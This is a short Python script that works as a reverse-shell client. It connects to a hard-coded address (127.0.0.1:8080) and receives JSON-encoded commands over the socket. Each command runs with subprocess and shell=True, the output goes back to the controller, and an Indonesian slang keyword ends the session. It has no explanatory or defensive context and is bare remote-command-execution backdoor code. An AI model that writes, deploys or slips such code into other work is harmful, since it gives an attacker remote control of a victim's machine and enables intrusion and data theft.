import json
import socket
import subprocess


def kampret_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def kampret_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = kampret_recv()
        if command == 'bijipeler':
            break
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        kampret_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8080))
shell()

